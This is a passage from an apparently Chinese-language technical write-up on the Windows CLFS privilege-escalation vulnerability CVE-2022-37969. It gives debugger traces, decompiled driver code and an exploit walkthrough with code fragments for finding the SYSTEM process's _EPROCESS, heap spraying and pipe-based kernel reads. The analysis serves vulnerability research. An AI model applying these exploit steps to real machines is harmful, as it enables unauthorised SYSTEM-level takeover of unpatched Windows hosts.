style="color:#f92672">::</span>Finalize<span style="color:#f92672">+</span><span style="color:#ae81ff">0x39b</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa6c0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b71df42 CLFS<span style="color:#f92672">!</span>CClfsLogFcbPhysical<span style="color:#f92672">::</span>Release<span style="color:#f92672">+</span><span style="color:#ae81ff">0xb1</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa720 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b720878 CLFS<span style="color:#f92672">!</span>CClfsRequest<span style="color:#f92672">::</span>Close<span style="color:#f92672">+</span><span style="color:#ae81ff">0xd6</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa770 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b720747 CLFS<span style="color:#f92672">!</span>ClfsDispatchIoRequest<span style="color:#f92672">+</span><span style="color:#ae81ff">0x108</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa7c0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>d8abac5 CLFS<span style="color:#f92672">!</span>CClfsDriver<span style="color:#f92672">::</span>LogIoDispatch<span style="color:#f92672">+</span><span style="color:#ae81ff">0x27</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">07</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa7f0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>dbf088f nt<span style="color:#f92672">!</span>IofCallDriver<span style="color:#f92672">+</span><span style="color:#ae81ff">0x55</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">08</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa830 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>dc19af0 nt<span style="color:#f92672">!</span>IopDeleteFile<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14f</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">09</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa8b0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>d8ae1a7 nt<span style="color:#f92672">!</span>ObpRemoveObjectRoutine<span style="color:#f92672">+</span><span style="color:#ae81ff">0x80</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>a fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa910 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>dc22449 nt<span style="color:#f92672">!</span>ObfDereferenceObjectWithTag<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc7</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>b fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa950 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>dc2627c nt<span style="color:#f92672">!</span>ObCloseHandleTableEntry<span style="color:#f92672">+</span><span style="color:#ae81ff">0x6c9</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>c fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aaa90 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>da0a2b5 nt<span style="color:#f92672">!</span>NtClose<span style="color:#f92672">+</span><span style="color:#ae81ff">0xec</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>d fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aab00<span style="color:#ae81ff">00007ff</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b48d124 nt<span style="color:#f92672">!</span>KiSystemServiceCopyEnd<span style="color:#f92672">+</span><span style="color:#ae81ff">0x25</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>e<span style="color:#ae81ff">0000001</span>d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">518f</span>e678<span style="color:#ae81ff">00007ff</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">08</span>bea405 ntdll<span style="color:#f92672">!</span>NtClose<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0f</span><span style="color:#ae81ff">0000001</span>d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">518f</span>e680<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">0x00007ff8</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">08</span>bea405</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> u</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>RemoveContainer<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10f</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716ebf<span style="color:#ae81ff">498</span>b7f18 mov rdi,qword ptr [r15<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h]</span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716ec3<span style="color:#ae81ff">4885ff</span> test rdi,rdi</span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716ec6<span style="color:#ae81ff">0f</span><span style="color:#ae81ff">84</span>b9000000 je CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>RemoveContainer<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d5</span> (fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716f85)</span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716ecc<span style="color:#ae81ff">4983671800</span> and qword ptr [r15<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h],<span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716ed1<span style="color:#ae81ff">65488</span>b142588010000 mov rdx,qword ptr gs:[<span style="color:#ae81ff">188</span>h]</span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716eda<span style="color:#ae81ff">488</span>b4e20 mov rcx,qword ptr [rsi<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>h]</span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716ede<span style="color:#ae81ff">4</span>c8b15c3d1ffff mov r10,qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">_imp_ExReleaseResourceForThreadLite</span> (fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b7140a8)]</span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716ee5 e8a6552102 call nt<span style="color:#f92672">!</span><span style="color:#a6e22e">ExReleaseResourceForThreadLite</span> (fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>d92c490)</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">RemoveContainer</span>(CClfsBaseFilePersisted<span style="color:#f92672">*</span>this,<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> v2;<span style="color:#75715e">// r12</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> BOOLEAN v4;<span style="color:#75715e">// r14</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> BaseLogRecord;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v6;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v7;<span style="color:#75715e">// r14d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> Symbol;<span style="color:#75715e">// eax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v9;<span style="color:#75715e">// ebx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> _CLFS_CONTAINER_CONTEXT<span style="color:#f92672">*</span>v10;<span style="color:#75715e">// r15</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v11;<span style="color:#75715e">// eax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v12;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v13;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> BOOLEAN v15;<span style="color:#75715e">// [rsp+20h] [rbp-38h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v16;<span style="color:#75715e">// [rsp+24h] [rbp-34h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> _CLFS_CONTAINER_CONTEXT<span style="color:#f92672">*</span>v17;<span style="color:#75715e">// [rsp+70h] [rbp+18h] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v2<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span><span style="color:#a6e22e">ExAcquireResourceExclusiveLite</span>(<span style="color:#f92672">*</span>((PERESOURCE<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>),<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span> v15<span style="color:#f92672">=</span> v4;</span></span><span style="display:flex;"><span> BaseLogRecord<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetBaseLogRecord</span>(this);</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span> BaseLogRecord;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>BaseLogRecord )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_20;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(BaseLogRecord<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span> v2<span style="color:#f92672">+</span><span style="color:#ae81ff">808</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v7 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1073741816</span>;</span></span><span style="display:flex;"><span>LABEL_14:</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span> v9;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_19;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> Symbol<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetSymbol</span>(this, v7, v2,<span style="color:#f92672">&amp;</span>v17);</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span> Symbol;</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span> Symbol;</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span> v17;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v17 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( Symbol<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">RemoveSymbol</span>(this, v7);</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span> v9;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v9<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v17)<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span> v2<span style="color:#f92672">+</span><span style="color:#ae81ff">808</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span> v2<span style="color:#f92672">+</span><span style="color:#ae81ff">808</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">RtlClearBits</span>((PRTL_BITMAP)((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">232</span>), v2,<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">RtlNumberOfSetBits</span>((PRTL_BITMAP)((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">232</span>));</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v10<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">1</span> )</span></span><span style="display:flex;"><span><span style="color:#f92672">--*</span>(_DWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span><span style="color:#ae81ff">300</span>);</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">FlushImage</span>(this);</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span> v11;</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span> v11;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v11<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)v10<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v12 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)v10<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ExReleaseResourceForThreadLite</span>(<span style="color:#f92672">*</span>((PERESOURCE<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>), (ERESOURCE_THREAD)<span style="color:#a6e22e">KeGetCurrentThread</span>());</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>))(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)v12<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>i64))(v12);</span></span><span style="display:flex;"><span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>))(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)v12<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>i64))(v12);</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span> v16;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_20;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_19;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v11<span style="color:#f92672">!=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1073741816</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">OffsetToAddr</span>(this);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v13 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_BYTE<span style="color:#f92672">*</span>)(v13<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span> v2<span style="color:#f92672">+</span><span style="color:#ae81ff">808</span>)<span style="color:#f92672">=</span> (_DWORD)v17;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">RtlSetBits</span>((PRTL_BITMAP)((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">232</span>), v2,<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v10<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">1</span> )</span></span><span style="display:flex;"><span><span style="color:#f92672">++*</span>(_DWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span><span style="color:#ae81ff">300</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_19;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_14;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>LABEL_19:</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span> v15;</span></span><span style="display:flex;"><span>LABEL_20:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v4 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ExReleaseResourceForThreadLite</span>(<span style="color:#f92672">*</span>((PERESOURCE<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>), (ERESOURCE_THREAD)<span style="color:#a6e22e">KeGetCurrentThread</span>());</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v16;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v9;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>最后附上zscaler画的流程图</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/6.png"/></p><blockquote><p><a href="https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part" target="_blank">https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part</a></p></blockquote><h3 id="exp分析">EXP分析</h3><p>首先通过查询<code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentBuild</code> 来确定系统版本是否在范围内，因为在_EPROCESS中_TOKEN偏移是不固定的，此次所使用的偏移为0x4B8.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE,<span style="color:#a6e22e">TEXT</span>(<span style="color:#e6db74">"SOFTWARE</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Microsoft</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows NT</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">CurrentVersion"</span>), NULL, KEY_READ,<span style="color:#f92672">&amp;</span>hKey)<span style="color:#f92672">==</span> ERROR_SUCCESS) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[+] Registry key Opened successfully</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#a6e22e">RegQueryValueEx</span>(hKey,<span style="color:#a6e22e">TEXT</span>(<span style="color:#e6db74">"CurrentBuild"</span>), NULL,<span style="color:#f92672">&amp;</span>cType, (LPBYTE)lpData,<span style="color:#f92672">&amp;</span>buffersize);</span></span><span style="display:flex;"><span><span style="color:#75715e">// -1表示处理整个缓冲区</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">WideCharToMultiByte</span>(CP_UTF8,<span style="color:#ae81ff">0</span>, lpData,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, (LPSTR)buf,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span> winversion<span style="color:#f92672">=</span><span style="color:#a6e22e">atoi</span>(buf);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">"[+] Windows Build Number: %i</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, winversion);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (winversion<span style="color:#f92672">>=</span><span style="color:#ae81ff">17763</span><span style="color:#f92672">&amp;&amp;</span> winversion<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">22000</span>) {</span></span><span style="display:flex;"><span> token_offset<span style="color:#f92672">=</span><span style="color:#ae81ff">0x4b8</span>;<span style="color:#75715e">// store the token offset</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[!] Version %d not supported. Exiting...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, winversion);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>EXP通过调用<code>NtQuerySystemInformation</code> 函数，并将<code>SystemInformationClass</code> 参数设置为<code>SystemExtendedHandleInformation</code> 查询系统句柄信息（进程），遍历handle 列表，通过比较UniqueProcessId来确定找到的进程PID并返回其_EPROCESS地址，EXP中分别获取到自身的_EPROCESS地址和pid为4的进程的_EPROCESS地址。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>status<span style="color:#f92672">=</span><span style="color:#a6e22e">fnNtQuerySystemInformation</span>((SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, handleInfo, handleInfoSize,<span style="color:#f92672">&amp;</span>retLength);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (ULONG i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span> handleInfo<span style="color:#f92672">-></span>NumberOfHandles; i<span style="color:#f92672">++</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((USHORT)Object<span style="color:#f92672">==</span><span style="color:#ae81ff">0x4</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">0x4</span><span style="color:#f92672">==</span> (DWORD)handleInfo<span style="color:#f92672">-></span>Handles[i].UniqueProcessId<span style="color:#f92672">&amp;&amp;</span> (SIZE_T)Object<span style="color:#f92672">==</span> (SIZE_T)handleInfo<span style="color:#f92672">-></span>Handles[i].HandleValue)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> kernelAddress<span style="color:#f92672">=</span> (SIZE_T)handleInfo<span style="color:#f92672">-></span>Handles[i].Object;</span></span><span style="display:flex;"><span> bFind<span style="color:#f92672">=</span> TRUE;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">GetCurrentProcessId</span>()<span style="color:#f92672">==</span> (DWORD)handleInfo<span style="color:#f92672">-></span>Handles[i].UniqueProcessId<span style="color:#f92672">&amp;&amp;</span> (SIZE_T)Object<span style="color:#f92672">==</span> (SIZE_T)handleInfo<span style="color:#f92672">-></span>Handles[i].HandleValue)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> kernelAddress<span style="color:#f92672">=</span> (SIZE_T)handleInfo<span style="color:#f92672">-></span>Handles[i].Object;</span></span><span style="display:flex;"><span> bFind<span style="color:#f92672">=</span> TRUE;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>EXP进行堆喷射，循环在偏移0x10000开始每隔0x10位置写入0x500000。</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/7.png"/></p><p>绕过CreatePipe创建管道并通过<code>NtFsControlFile</code>设置管道属性，其中<code>FsControlCode</code> 参数被设为0x11003c，这使得在之后可以通过调用<code>NtFsControlFile</code>并传递<code>FsControlCode</code> 参数为0x110038来读取管道属性。</p><p>EXP通过调用<code>NtQuerySystemInformation</code>并传递<code>SystemInformationClass</code>参数为<code>SystemBigPoolInformation</code>查询内核堆信息。通过循环遍历堆信息并比较堆tag找到了Pipe堆在内核的地址。</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/8.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db ffffa48d64eff000</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff000<span style="color:#ae81ff">50</span><span style="color:#ae81ff">25</span> a6<span style="color:#ae81ff">67</span><span style="color:#ae81ff">8</span>d a4 ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">50</span><span style="color:#ae81ff">25</span> a6<span style="color:#ae81ff">67</span><span style="color:#ae81ff">8</span>d a4 ff ff P<span style="color:#f92672">%</span>.g....P<span style="color:#f92672">%</span>.g....</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff010<span 